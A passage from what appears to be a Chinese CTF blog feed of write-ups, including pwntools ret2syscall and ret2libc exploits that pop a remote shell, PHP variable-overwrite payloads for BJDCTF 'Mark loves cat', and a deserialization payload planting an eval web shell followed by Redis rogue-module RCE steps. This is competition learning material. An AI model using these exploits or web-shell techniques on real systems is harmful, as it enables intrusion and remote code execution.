class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(<span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;output :\n&#x27;</span> + output)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到密码为SEC2ETK3Y（大写），解开压缩包得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hsnctf&#123;y0u_can_g4t_easy_usb&#125;</span><br></pre></td></tr></table></figure><p>##pwn</p><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">from LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"># from ctypes <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;58.240.236.231&#x27;</span>,<span class="number">49003</span>)</span><br><span class="line"></span><br><span class="line"># r = gdb.debug(<span class="string">&#x27;./bheap&#x27;</span>)</span><br><span class="line"># r = process(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line"># libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"># libc = ELF(<span class="string">&#x27;/home/h711/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line"># ld-linux-x86-<span class="number">64.</span>so<span class="number">.2</span></span><br><span class="line"># srand = libc.srand(libc.time(<span class="number">0</span>)) #设置种子</span><br><span class="line"></span><br><span class="line">se      = lambda data               :r.send(data)</span><br><span class="line">sa      = lambda delim,data         :r.sendafter(delim, data)</span><br><span class="line">sl      = lambda data               :r.sendline(data)</span><br><span class="line">sla     = lambda delim,data         :r.sendlineafter(delim, data)</span><br><span class="line">sea     = lambda delim,data         :r.sendafter(delim, data)</span><br><span class="line">rc      = lambda numb=<span class="number">4096</span>          :r.recv(numb)</span><br><span class="line">rl      = lambda                    :r.recvline()</span><br><span class="line">ru      = lambda delims             :r.recvuntil(delims)</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(<span class="number">4</span>, b<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(<span class="number">8</span>, b<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">lic = lambda data               :uu64(ru(data)[-<span class="number">6</span>:])</span><br><span class="line">pack    = lambda str, addr          :p32(addr)</span><br><span class="line">padding = lambda lenth              :b<span class="string">&#x27;aaaaa&#x27;</span>*(lenth<span class="comment">//5)+b&#x27;F&#x27;*(lenth % 5)</span></span><br><span class="line">it      = lambda                    :r.interactive()</span><br><span class="line"></span><br><span class="line">rax = <span class="number">0x0000000000400721</span> #: pop rax ; <span class="type">ret</span></span><br><span class="line"><span class="variable">rdx</span> <span class="operator">=</span> <span class="number">0x0000000000400721</span> #: pop rdx ; <span class="type">ret</span></span><br><span class="line"><span class="variable">rsi</span> <span class="operator">=</span> <span class="number">0x000000000400735</span> #: pop rsi ; <span class="type">ret</span></span><br><span class="line"><span class="variable">rdx</span> <span class="operator">=</span> <span class="number">0x000000000400735</span>#:  pop rdx ; <span class="type">ret</span></span><br><span class="line"><span class="variable">ret</span> <span class="operator">=</span> <span class="number">0x0000000000400509</span> #: <span class="type">ret</span></span><br><span class="line"><span class="variable">binsh</span> <span class="operator">=</span> <span class="number">0x0000000000601048</span> #: /bin/<span class="type">sh</span></span><br><span class="line"><span class="variable">syscall</span> <span class="operator">=</span> <span class="number">0x000000000400741</span></span><br><span class="line">rdi = <span class="number">0x000000000040072b</span> #: pop rdi ; <span class="type">ret</span></span><br><span class="line"></span><br><span class="line"><span class="variable">pl</span> <span class="operator">=</span> b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(rax) + p64(<span class="number">0x3b</span>) + p64(rsi) + p64(<span class="number">0</span>) + p64(rdx) + p64(<span class="number">0</span>) + p64(rdi) + p64(binsh) + p64(syscall)</span><br><span class="line">sl(pl)</span><br><span class="line"></span><br><span class="line">it()</span><br></pre></td></tr></table></figure><p>hsnctf{85ef9d72-c603-17df-59bc}</p><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from ctypes import *</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;58.240.236.231&#x27;</span>,<span class="number">49002</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = gdb.debug(&#x27;./bheap&#x27;)</span></span><br><span class="line"><span class="comment"># r = process(&#x27;1&#x27;)</span></span><br><span class="line"><span class="comment"># libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/home/h711/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># ld-linux-x86-64.so.2</span></span><br><span class="line"><span class="comment"># srand = libc.srand(libc.time(0)) #设置种子</span></span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :r.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :r.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :r.recv(numb)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :r.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :r.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">lic = <span class="keyword">lambda</span> data               :uu64(ru(data)[-<span class="number">6</span>:])</span><br><span class="line">pack    = <span class="keyword">lambda</span> <span class="built_in">str</span>, addr          :p32(addr)</span><br><span class="line">padding = <span class="keyword">lambda</span> lenth              :<span class="string">b&#x27;aaaaa&#x27;</span>*(lenth//<span class="number">5</span>)+<span class="string">b&#x27;F&#x27;</span>*(lenth % <span class="number">5</span>)</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :r.interactive()</span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;vul&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi = <span class="number">0x0000000000400783</span></span><br><span class="line">ret = <span class="number">0x0000000000400509</span></span><br><span class="line">rc()</span><br><span class="line">pl = <span class="number">0xD8</span>*<span class="string">b&#x27;a&#x27;</span> + p64(ret) + p64(rdi) + p64(puts_got) + p64(puts_plt)  + p64(main)</span><br><span class="line">sl(pl)</span><br><span class="line"><span class="comment"># print(rc())</span></span><br><span class="line">put_addr = lic(<span class="string">&#x27;\x7f&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;put====&gt;&#x27;</span>,<span class="built_in">hex</span>(put_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,put_addr)</span><br><span class="line">base = put_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xD8</span> + p64(ret) + p64(rdi) + p64(binsh) + p64(system)</span><br><span class="line">sl(pl2)</span><br><span class="line"></span><br><span class="line">it()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sl()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hsnctf{04b4cfca-db86-486b-14b2}</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>###git</p><p><a href="https://blog.csdn.net/m0_62879498/article/details/124586653%E5%80%9F%E9%89%B4%E5%8E%9F%E9%A2%98">https://blog.csdn.net/m0_62879498/article/details/124586653借鉴原题</a></p><p>Git扫描后发现git泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">print_r($flag);</span><br><span class="line"></span><br><span class="line">$yds = &quot;dog&quot;;</span><br><span class="line">$is = &quot;cat&quot;;</span><br><span class="line">$handsome = &#x27;yds&#x27;;</span><br><span class="line"></span><br><span class="line">foreach($_POST as $x =&gt; $y)&#123;  // $键 = $值的值</span><br><span class="line">    $$x = $y;  </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;// $handsome = flag的值  ---&gt;   $handsome = $flag  --&gt; $x=handsome &amp; $y=flag</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> // 需要不满足以下几个条件</span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;  //不能同时 flag的值等于某个键名，那个键值又是flag</span><br><span class="line">        exit($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;// 不能同时  GET 和 POST 都没设置 flag</span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;// 任意都不能满足 flag === &#x27;flag&#x27;</span><br><span class="line">    exit($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;the flag is: &quot;.$flag;</span><br></pre></td></tr></table></figure><p>利用条件：</p><p>if($_GET[‘flag’] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; ‘flag’){ &#x2F;&#x2F;不能同时  flag的值等于某个键名，那个键名又是flag, 就是 flag&#x3D;a &amp;&amp; a!&#x3D;flag啊，这样就能进了  ?flag&#x3D;(不是flag)&amp;(不是flag)&#x3D;xxx<br> 进入条件十分简单：?flag&#x3D;a&amp;a&#x3D;flag 即可<br>函数判断到 a&#x3D;flag 的时候， $_GET[‘flag’] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; ‘flag’ –&gt; a &#x3D;&#x3D;&#x3D; a &amp;&amp; a !&#x3D;&#x3D; ‘flag’ 这就进来了 true &amp;&amp; true 就进来了， 然后 exit($handsome);<br>因为要 <code>exit($handsome);</code> 那么我们要做的就是 让<code>$handsome = $flag get</code> 条件的处理如下：</p><p>​    foreach($_GET as $x &#x3D;&gt; $y){<br>​        $$x &#x3D; $$y;&#x2F;&#x2F; $handsome &#x3D; flag的值  —&gt;   $handsome &#x3D; $flag  –&gt; $x&#x3D;handsome &amp; $y&#x3D;flag<br>​    }</p><p><code>$$x = $$y</code>而我们要的结果是<code>$handsome = $flag</code>那么特简单 让 <code>​x=handsome 和 $y=flag</code>即可</p><blockquote><p>playload:?handsome&#x3D;flag&amp;flag&#x3D;b&amp;b&#x3D;flag</p></blockquote><p><img src="/2023/09/01/%E7%BB%93%E8%90%A5%E8%B5%9Bwp/image/image-20230818225755467-1700989357412-28-1700994419702-3.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 赛事 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Esay_eval</title>
      <link href="/2023/08/31/%5B%E5%A4%A9%E7%BF%BC%E6%9D%AF%202021%5Desay_eval%20/"/>
      <url>/2023/08/31/%5B%E5%A4%A9%E7%BF%BC%E6%9D%AF%202021%5Desay_eval%20/</url>
      
        <content type="html"><![CDATA[<p>#[天翼杯 2021]esay_eval </p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class A&#123;</span><br><span class="line">    public $code = &quot;eval(\$_POST[1]);&quot;;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this -&gt; a=new A();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new B();</span><br><span class="line">$poc = serialize($c);</span><br><span class="line">// echo $poc.&quot;&lt;br&gt;&quot;;</span><br><span class="line">$payload = str_replace(&#x27;A&quot;:1&#x27;,&#x27;a&quot;:2&#x27;,$poc);</span><br><span class="line">echo &#x27;?poc=&#x27;.$payload;</span><br></pre></td></tr></table></figure><p>用蚁剑连上，发现有vim缓存泄露，用vim恢复后发现这个题用了redis，然后利用redis进行RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis密码：you_cannot_guess_it</span><br><span class="line">redis管理插件（蚁剑）：</span><br><span class="line">git clone https://github.com/Medicean/AS_Redis.git</span><br><span class="line">恶意exp：</span><br><span class="line">git clone https://github.com/Dliv3/redis-rogue-server.git</span><br></pre></td></tr></table></figure><ol><li>上传exp.so到&#x2F;var&#x2F;www&#x2F;html下</li><li>连接redis执行命令 MODULE LOAD “&#x2F;var&#x2F;www&#x2F;html&#x2F;exp.so”</li><li>RCE: system.exec “你的命令”</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2022 Mark Loves Cat</title>
      <link href="/2023/08/31/%5BBJDCTF2020%5DMark%20loves%20cat/"/>
      <url>/2023/08/31/%5BBJDCTF2020%5DMark%20loves%20cat/</url>
      
        <content type="html"><![CDATA[<h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><p><img src="/2023/08/31/[BJDCTF2020]Mark%20loves%20cat/image/image-20230820163325149-1700989334020-17-1700994164573-17.png"></p><p>flag.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag = file_get_contents(&#x27;/flag&#x27;);</span><br></pre></td></tr></table></figure><p>index.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>如果进行get传参，那么传参名会被加上$，传参值也会被加上$，举个例子，假如我们get传入参数：a=b，那么经过foreach之后，就会被替换成：$a=$b如果进行post传参，那么传参名会被加上$，而传参值不会发生变化，同样举个例子：假设我们post传入参数：a=b，那么经过foreach之后，就会被替换成$a=b</code></pre><p>然后是3个连着的if语句，我们要做的就是利用这几个if语句来进行变量的覆盖<br>这里要简要的说个知识点，是关于exit()函数的：</p><pre><code>也就是它虽然会退出执行，但依然会输出其参数，所以我们就要将exit()里面的参数换为我们想要的参数，也就是最后一句的：echo &quot;the flag is: &quot;.$flag;</code></pre><h2 id="playload1"><a href="#playload1" class="headerlink" title="playload1"></a>playload1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?is=flag&amp;flag=flag</span><br></pre></td></tr></table></figure><p>通过GET方式传入is&#x3D;flag&amp;flag&#x3D;flag后，先经过foreach函数，得到<code>$is=$flag</code>，继续达到这串代码</p><p><img src="/2023/08/31/[BJDCTF2020]Mark%20loves%20cat/image/image-20230820165620201-1700989334020-18-1700994164574-18.png"></p><h2 id="playload2"><a href="#playload2" class="headerlink" title="playload2"></a>playload2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用这串代码，如果get和post传参里都没有flag，就返回yds，加上前面的便历，将yds&#x3D;flag变为$yds&#x3D;$flag</p><h2 id="playload3"><a href="#playload3" class="headerlink" title="playload3"></a>playload3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?handsome=flag&amp;flag=x&amp;x=flag</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>; /</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果GET型中flag变量的值等于GET型中一个不为flag的键名则退出<br>?flag&#x3D;a</p><p>a&#x3D;flag        </p><h1 id="primtive"><a href="#primtive" class="headerlink" title="primtive"></a>primtive</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//hint.php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$value</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span 